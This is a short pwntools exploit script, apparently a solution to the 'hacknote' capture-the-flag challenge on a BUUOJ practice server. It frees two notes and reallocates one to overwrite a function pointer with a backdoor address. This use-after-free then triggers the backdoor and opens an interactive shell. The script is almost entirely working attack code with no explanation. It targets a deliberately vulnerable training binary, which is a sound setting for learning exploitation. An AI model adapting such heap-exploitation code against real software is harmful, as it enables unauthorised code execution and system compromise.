from pwn import *


ld_path = ""
libc_path = ""
# p = process([ld_path, ""], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("./hacknote")
p = remote("node4.buuoj.cn", 26944)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice :", "1")
    sa("Note size :", str(size))
    sa("Content :", con)

def free(index):
    sa("Your choice :", "2")
    sa("Index :", str(index))

def show(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))


back_door = 0x08048945

# uaf
add(0x10, "0")
add(0x10, "1")
free(0)
free(1)
add(0x8, p64(back_door)*2)
show(0)

shell()


